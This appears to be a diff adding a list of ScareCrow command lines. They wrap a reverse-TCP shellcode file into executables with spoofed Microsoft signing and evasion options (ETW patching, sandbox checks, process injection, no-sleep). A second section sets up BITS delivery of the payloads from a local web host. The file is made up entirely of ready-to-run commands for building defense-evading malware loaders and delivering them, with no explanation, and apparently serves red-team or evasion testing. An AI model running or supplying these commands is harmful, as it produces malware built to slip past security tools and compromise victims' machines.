@@ -1,0 +1,40 @@
+Binary Local Payloads
+
+./ScareCrow -I payload.bin -Loader binary -domain www.microsoft.com -sandbox -O payload_rev_tcp_sandbox.exe 
+./ScareCrow -I payload.bin -Loader binary -domain www.microsoft.com -nosleep -O payload_rev_tcp_nosleep.exe 
+./ScareCrow -I payload.bin -Loader binary -domain www.microsoft.com -noetw -O payload_rev_tcp_noetw.exe
+./ScareCrow -I payload.bin -Loader binary -domain www.microsoft.com -injection "C:\Windows\Temp\" -O payload_rev_tcp_injection.exe  
+./ScareCrow -I payload.bin -Loader binary -domain www.microsoft.com -unmodified -O payload_rev_tcp_unmod.exe 
+./ScareCrow -I payload.bin -Loader binary -domain www.microsoft.com -sandbox -unmodified -O payload_rev_tcp_unmod_sandbox.exe 
+./ScareCrow -I payload.bin -Loader binary -domain www.microsoft.com -nosleep -sandbox -unmodified -O payload_rev_tcp_unmod_sanbox_nosleep.exe 
+./ScareCrow -I payload.bin -Loader binary -domain www.microsoft.com -noetw -nosleep -sandbox -unmodified -O payload_rev_tcp_unmod_sandbox_nosleep_noetw.exe 
+./ScareCrow -I payload.bin -Loader binary -domain www.microsoft.com -noetw -nosleep -O payload_rev_tcp_nosleep_noetw.exe 
+./ScareCrow -I payload.bin -Loader binary -domain www.microsoft.com -noetw -nosleep -sandbox -O payload_rev_tcp_sandbox_nosleep_noetw.exe 
+./ScareCrow -I payload.bin -Loader binary -domain www.microsoft.com -injection "C:\Windows\Temp\" -noetw -nosleep -sandbox -O payload_rev_tcp_inject_sandbox_nosleep_noetw.exe 
+./ScareCrow -I payload.bin -Loader binary -domain www.microsoft.com -injection "C:\Windows\Temp\" -sandbox -O payload_rev_tcp_inject_sandbox.exe
+./ScareCrow -I payload.bin -Loader binary -domain www.microsoft.com -injection "C:\Windows\Temp\" -noetw -O payload_rev_tcp_inject_noetw.exe
+./ScareCrow -I payload.bin -Loader binary -domain www.microsoft.com -injection "C:\Windows\Temp\" -nosleep -O payload_rev_tcp_inject_nosleep.exe
+./ScareCrow -I payload.bin -Loader binary -domain www.microsoft.com -injection "C:\Windows\Temp\" -unmodified -O payload_rev_tcp_inject_unmod.exe
+./ScareCrow -I payload.bin -Loader binary -domain www.microsoft.com -nosleep -sandbox -O payload_rev_tcp_sandbox_nosleep.exe 
+./ScareCrow -I payload.bin -Loader binary -domain www.microsoft.com -injection "C:\Windows\Temp\" -noetw -nosleep -sandbox -unmodified -O payload_rev_tcp_all.exe 
+
+Binary Delivery Payloads 
+
+./ScareCrow -I payload.bin -Loader binary -domain www.microsoft.com -injection "C:\Windows\Temp\" -noetw -nosleep -sandbox -unmodified -O payload_rev_tcp.exe -delivery bits -url http://192.168.1.20/payload_rev_tcp.exe
+./ScareCrow -I payload.bin -Loader binary -domain www.microsoft.com -sandbox -O payload_rev_tcp_sandbox.exe -delivery bits -url http://192.168.1.20/payload_rev_tcp_sandbox.exe
+./ScareCrow -I payload.bin -Loader binary -domain www.microsoft.com -nosleep -O payload_rev_tcp_nosleep.exe -delivery bits -url http://192.168.1.20/payload_rev_tcp_nosleep.exe
+./ScareCrow -I payload.bin -Loader binary -domain www.microsoft.com -noetw -O payload_rev_tcp_noetw.exe -delivery bits -url http://192.168.1.20/payload_rev_tcp_noetw.exe
+./ScareCrow -I payload.bin -Loader binary -domain www.microsoft.com -injection "C:\Windows\Temp\" -O payload_rev_tcp_injection.exe -delivery bits -url http://192.168.1.20/payload_rev_tcp_injection.exe
+./ScareCrow -I payload.bin -Loader binary -domain www.microsoft.com -unmodified -O payload_rev_tcp_unmod.exe -delivery bits -url http://192.168.1.20/payload_rev_tcp_unmod.exe
+./ScareCrow -I payload.bin -Loader binary -domain www.microsoft.com -sandbox -unmodified -O payload_rev_tcp_unmod_sandbox.exe -delivery bits -url http://192.168.1.20/payload_rev_tcp_unmod_sandbox.exe
+./ScareCrow -I payload.bin -Loader binary -domain www.microsoft.com -nosleep -sandbox -unmodified -O payload_rev_tcp_unmod_sanbox_nosleep.exe -delivery bits -url http://192.168.1.20/payload_rev_tcp_unmod_sanbox_nosleep.exe
+./ScareCrow -I payload.bin -Loader binary -domain www.microsoft.com -noetw -nosleep -sandbox -unmodified -O payload_rev_tcp_unmod_sandbox_nosleep_noetw.exe -delivery bits -url http://192.168.1.20/payload_rev_tcp_unmod_sandbox_nosleep_noetw.exe
+./ScareCrow -I payload.bin -Loader binary -domain www.microsoft.com -noetw -nosleep -O payload_rev_tcp_nosleep_noetw.exe -delivery bits -url http://192.168.1.20/payload_rev_tcp_nosleep_noetw.exe
+./ScareCrow -I payload.bin -Loader binary -domain www.microsoft.com -noetw -nosleep -sandbox -O payload_rev_tcp_sandbox_nosleep_noetw.exe -delivery bits -url http://192.168.1.20/payload_rev_tcp_sandbox_nosleep_noetw.exe
+./ScareCrow -I payload.bin -Loader binary -domain www.microsoft.com -injection "C:\Windows\Temp\" -noetw -nosleep -sandbox -O payload_rev_tcp_inject_sandbox_nosleep_noetw.exe -delivery bits -url http://192.168.1.20/payload_rev_tcp_inject_sandbox_nosleep_noetw.exe
+./ScareCrow -I payload.bin -Loader binary -domain www.microsoft.com -injection "C:\Windows\Temp\" -sandbox -O payload_rev_tcp_inject_sandbox.exe -delivery bits -url http://192.168.1.20/payload_rev_tcp_inject_sandbox.exe
+./ScareCrow -I payload.bin -Loader binary -domain www.microsoft.com -injection "C:\Windows\Temp\" -noetw -O payload_rev_tcp_inject_noetw.exe -delivery bits -url http://192.168.1.20/payload_rev_tcp_inject_noetw.exe
+./ScareCrow -I payload.bin -Loader binary -domain www.microsoft.com -injection "C:\Windows\Temp\" -nosleep -O payload_rev_tcp_inject_nosleep.exe -delivery bits -url http://192.168.1.20/payload_rev_tcp_inject_nosleep.exe
+./ScareCrow -I payload.bin -Loader binary -domain www.microsoft.com -injection "C:\Windows\Temp\" -unmodified -O payload_rev_tcp_inject_unmod.exe -delivery bits -url http://192.168.1.20/payload_rev_tcp_inject_unmod.exe
+./ScareCrow -I payload.bin -Loader binary -domain www.microsoft.com -nosleep -sandbox -O payload_rev_tcp_sandbox_nosleep.exe -delivery bits -url http://192.168.1.20/payload_rev_tcp_sandbox_nosleep.exe
+./ScareCrow -I payload.bin -Loader binary -domain www.microsoft.com -injection "C:\Windows\Temp\" -noetw -nosleep -sandbox -unmodified -O payload_rev_tcp_all.exe -delivery bits -url http://192.168.1.20/payload_rev_tcp_all.exe
